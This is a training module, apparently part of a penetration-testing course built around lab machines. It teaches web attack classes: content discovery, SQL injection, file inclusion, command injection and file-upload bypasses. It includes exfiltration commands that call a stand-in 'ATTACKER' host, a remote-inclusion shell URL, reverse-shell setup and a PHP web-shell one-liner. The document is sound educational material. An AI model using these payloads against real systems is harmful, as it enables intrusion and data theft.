# 02 — Web Attacks

Web is where most of this path lives: **nine of the thirteen machines** are entered
through a browser-facing service. This module covers the six attack classes you
will actually use.

Full treatment: [`docs/CONCEPTS.md` §8](../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
(content discovery and HTTP status codes) and
[§13](../docs/CONCEPTS.md#13-web-application-attack-classes) (every web attack class).

---

## 1. Start with curl, not Burp

Before any tool, look at the site the way a client does:

```bash
curl -sI http://192.168.56.104/                  # headers only
curl -s  http://192.168.56.104/ | head -60       # first 60 lines of HTML
curl -s  http://192.168.56.104/robots.txt
curl -s  http://192.168.56.104/ | grep -iE 'comment|<!--|password|secret|flag'
```

`-s` silences the progress meter, `-I` requests only headers. This takes ten
seconds and routinely finds what an hour of tooling misses: a framework version, a
revealing `Server:` header, an HTML comment containing a username, a `robots.txt`
entry pointing straight at the flag.

**Headers worth reading:**

| Header | Tells you |
| --- | --- |
| `Server:` | Exact web server and version → `searchsploit` |
| `X-Powered-By:` | PHP/ASP version |
| `X-Generator:` | **The CMS and its version** — WordPress, Drupal, Koken |
| `Set-Cookie:` | Session scheme; `PHPSESSID` ⇒ PHP, `JSESSIONID` ⇒ Java, `wordpress_*` ⇒ WordPress, `laravel_session` ⇒ Laravel |
| `Location:` | Where a redirect goes — often reveals a hidden path |
| `WWW-Authenticate:` | Which auth scheme protects a `401` |
| `DAV:` | **WebDAV is enabled — the directory may be writable over HTTP** |

**Always read the page source too.** Authors hide usernames, base64 blobs and
hints in `<!-- comments -->` — Machines 2, 6 and 13 all start there.

---

## 2. Content discovery: what a wordlist attack actually is

**Content discovery** means guessing URL paths and keeping the ones that exist.
There is no cleverness — it is a dictionary attack against the URL space. A server
will serve anything it has, and does not advertise an index.

```bash
gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 40
dirb http://192.168.56.104/ /usr/share/wordlists/dirb/big.txt
ffuf -u http://192.168.56.104/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

| Wordlist | Size | Use |
| --- | --- | --- |
| `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
| `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
| `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
| **SecLists** | huge | The professional standard — `sudo apt install seclists` |

**Why wordlists work:** web directory names are not random. `/admin`,
`/phpmyadmin`, `/wp-content` appear on thousands of sites, so a curated list of a
few thousand words beats a random generator of millions.

### The status codes are the entire result

| Code | Meaning | What you do |
| --- | --- | --- |
| `200` | Exists and is readable | Read it |
| **`201`** | **Created** — a `PUT` succeeded | **You can write files here.** Look for WebDAV |
| `301` / `302` | Redirect | Usually a *directory* needing a trailing `/`; follow it |
| **`403`** | Forbidden | **It exists** but you may not read it — that is itself a disclosure. Try another path in, or another verb |
| `404` | Not found | The baseline. If *everything* 404s, your wordlist or extension list is wrong |
| `401` | Unauthenticated | See below |
| **`500`** | Server error | **Your input broke something.** Very often injection |

> **`401` vs `403` matters more than anything else here.** `401` means *"I don't
> know who you are"* — so authenticate. `403` means *"I know who you are and you
> may not"* — so authorisation is the problem, and no password will fix it.
> Confusing them wastes hours.

### The extension flag is the difference between nothing and everything

`/secret` returns 404. `/secret.txt` returns 200. **If a scan comes back empty,
change the extension list before you change the wordlist** — try
`php,txt,html,bak,old,zip,conf,log,inc`. Machine 1 and Machine 7 both hinge on
this.

Also always fetch these by hand before scanning:

```bash
curl -s http://target/robots.txt        # Machine 2 and 7 both hide things here
curl -s http://target/sitemap.xml
curl -s http://target/.htaccess
curl -sI http://target/                  # look for X-Generator
```

---

## 3. SQL injection

The application builds a query by concatenating your input:

```php
$q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
```

Supply `admin' -- ` and it becomes:

```sql
SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
```

`-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
password check is deleted and you are logged in as an administrator with no
password. Your input escaped the *data* context and became *code*.

**Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a
database error, a changed page length, or a different status code.

| Payload | What it does |
| --- | --- |
| `' OR 1=1 --` | Tautology |
| `' OR '1'='1` | String-context tautology |
| `\' OR 1=1 --` | **Backslash escape** — breaks out when the app escapes your quote. Machine 9 uses this |
| `1' UNION SELECT 1,2,3 --` | Find the column count, then extract data |
| `1' AND SLEEP(5) --` | **Time-based blind** — the only signal is how long the response takes |
| `1' AND SUBSTRING(user(),1,1)='r' --` | **Boolean blind** — the only signal is a different page |

```bash
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D db -T users --dump
sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
```

> **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> reason is usually that you have not told it *where* the injectable parameter is,
> that authentication is needed (`--cookie=`), or that the injection is
> second-order. Confirm manually with a single `'` first — it takes ten seconds and
> tells you whether sqlmap has anything to work with.

**Practise it on Machine 9 (CengBox: 1)**, which has boolean-blind, time-blind and
UNION injection in one application, and again on Machine 10 (PwnLab).

---

## 4. Local File Inclusion

A script passes a user-controlled path to `include()` or a file-read function:

```php
<?php include($_GET['page']); ?>     // you control a filesystem path
```

```text
?page=/etc/passwd
?page=../../../../etc/passwd
?page=/var/log/apache2/access.log                 # log poisoning
?page=php://filter/convert.base64-encode/resource=index.php
```

**Memorise the `php://filter` wrapper.** It returns the file **base64-encoded
instead of executing it**, so you can read PHP *source code* — which is how you
recover `wp-config.php`, `configuration.php` and `.env`, i.e. the database
credentials. Machine 10 is built around this.

**LFI alone only reads.** To get code execution you must make the target *write* a
file you control somewhere predictable, then include it:

| Primitive | How | Machine |
| --- | --- | --- |
| **SMTP log poisoning** | Inject PHP through a `MAIL FROM`/`RCPT TO` string or a crafted `User-Agent`, then include `/var/log/apache2/access.log` or the mail spool | 12 |
| Session files | Include `/var/lib/php/sessions/sess_<your PHPSESSID>` | — |
| `/proc/self/environ` | Include the process environment | — |
| A writable share | Write via NFS/SMB, include via HTTP | — |

**RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
`allow_url_include=1` in `php.ini`, off by default since PHP 5.2. When it fails the
error usually says `http:// wrapper is disabled` — which tells you to switch to LFI
plus a local write.

---

## 5. Command injection

The application passes your input to a shell:

```php
system("ping -c 4 " . $_GET['host']);
```

Break out with a shell metacharacter:

| Payload | Effect |
| --- | --- |
| `; id` | Run sequentially, regardless of the first command's result |
| `\| id` | Pipe — run next |
| `\|\| id` | Run only if the first **failed** |
| `&& id` | Run only if the first **succeeded** |
| `` `id` `` / `$(id)` | Command substitution — preferred, nestable |
| `%0a id` | A URL-encoded **newline**; works when `;` and `\|` are filtered |

**When output comes back** you are done. **When it does not** ("blind"), exfiltrate
out-of-band — run a listener first and watch its log:

```bash
$(curl http://ATTACKER/$(whoami))      # data arrives in the URL of a request YOU receive
$(nslookup $(whoami).ATTACKER.com)     # data in DNS — survives most egress rules
; sleep 10                             # a pure timing oracle, needs no network at all
```

**If characters are stripped, find out exactly what survives.** Submit
`;|&$\`(){}[]<>` as one string and see which come back. Filters are usually a
`str_replace` of a short list and almost always miss something — commonly a
newline, or a doubled character (`;;` collapsing to `;` after one removal pass).
Machine 6 is the clean introduction; Machine 9 has a filter you bypass with
encoding.

---

## 6. File upload → web shell

The goal is a file **in a directory the web server executes**. Every defence has a
standard bypass:

| Defence | Bypass | Machine |
| --- | --- | --- |
| Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.ceng` (a custom executable extension), `.php.jpg`, `.php%00.jpg` | 9, 11 |
| MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — **it is client-controlled and worthless** | 13 |
| `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.gif shell.php > polyglot.php` | 10, 13 |
| Allow-list declared but never enforced | Read the source; upload anything | 13 |
| Randomised filename | Reverse-engineer the scheme — `md5($name . rand(1,100))` is 100 candidates | 13 |
| Uploads outside the docroot | Find the real path from an error message, or from the framework's conventions | — |

```bash
# A ready-made PHP reverse shell, and verifying you edited it before uploading:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
grep -nE '^\$(ip|port)' shell.php
```

**Always verify where the file landed.** If the app does not tell you, infer it
from framework conventions (`/wp-content/uploads/YYYY/MM/`, `images/`,
`storage/`) and confirm with a HEAD request before wiring up a listener.

> Machine 13 is the capstone for this class: the developer published the
> vulnerable source on GitHub, so you read the actual filter code and defeat it
> precisely rather than by trial and error. That is the professional version of
> this skill.

---

## 7. CMS-specific notes

### WordPress (Machines 4, 7, 12)

```bash
wpscan --url http://target/ -e u,vp,vt,cb --api-token <free token>
```

| `-e` value | Enumerates |
| --- | --- |
| `u` | **Users** — via `/wordpress/?author=1` → `301` → `/author/<username>/` |
| `vp` / `vt` | **Vulnerable** plugins / themes (the most common compromise vector) |
| `p` / `t` | All plugins / themes |
| `cb` | **Config backups** — `wp-config.php.bak`, `.wp-config.php.swp`. A jackpot |

WordPress's `wp-config.php` must contain the database credentials in plaintext,
because it needs them on every request. Any LFI anywhere on the site leaks them.
Also note the **Theme Editor and Plugin Editor**: an administrator can edit PHP
directly from the dashboard, so *WordPress admin access is remote code execution*.
Machines 7 and 12 both use this.

### Drupal (Machine 3)

`CHANGELOG.txt`, `MAINTAINERS.txt` and `UPGRADE.txt` are usually web-readable and
give the **exact version**. Drupalgeddon (CVE-2014-3704, Drupal 7.x < 7.32) is
pre-authentication SQL injection; Drupalgeddon2 (CVE-2018-7600) is pre-auth RCE.
Both have Metasploit modules. `?q=user/1`, `?q=user/2` enumerate accounts.

### Everything else (Machines 11, 13)

Identify the CMS from `X-Generator`, the login page's HTML, or a distinctive path
(`/admin.php`, `/api/`), then search its exact version on Exploit-DB. Koken
(Machine 11) validates uploads **client-side only**, so editing the request in
Burp defeats it entirely.

---

## 8. Exercises

Use a deliberately vulnerable local target — **never a real website**.
[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) and
[DVWA](https://github.com/digininja/DVWA) both run in Docker in one command.

1. **Content discovery.** Run `gobuster` against DVWA with `common.txt`, then with
   `-x php,txt,bak`. Record what the extension flag found that the first pass did not.
2. **Status codes.** Find one `403` and one `401` on the same target. Explain in
   your notes why they need different responses.
3. **SQL injection, manually.** Solve DVWA's SQLi at *low*, then at *medium* and
   *high*. Only then run `sqlmap` on *low* and compare what it did to what you did.
4. **LFI.** Use `php://filter/convert.base64-encode/resource=` to read the source of
   a PHP file on DVWA. Decode it and find a secret that the rendered page never shows.
5. **Command injection.** Solve DVWA's Command Injection at *low*, then find the
   blacklist it applies at *medium* and bypass it with a character the filter missed.
6. **Upload.** Put a PHP one-liner (`<?php system($_GET['c']); ?>`) into a valid GIF
   with `cat`, upload it somewhere that checks magic bytes, and execute it.

---

## 9. Check yourself

1. Which HTTP status code means "this path exists but you may not read it", and why
   is that itself a finding?
2. What is the difference between `401` and `403`, and what does each tell you to do next?
3. Why does `php://filter/convert.base64-encode/resource=index.php` return *source
   code* instead of executing the page?
4. Why does `' OR 1=1 --` need the trailing space after `--`?
5. A file upload accepts your `.php` but the server returns it as text instead of
   executing it. What are the two most likely explanations?
6. You found command injection but no output appears in the response. Name two ways
   to confirm it and exfiltrate data anyway.
7. Why is WordPress administrator access equivalent to remote code execution?

---

_Back to [Learning Path 1](README.md) · previous: [01 — Foundations](01-Foundations-Networking-and-Recon.md) · next: [03 — Service and Network Attacks](03-Service-and-Network-Attacks.md)._
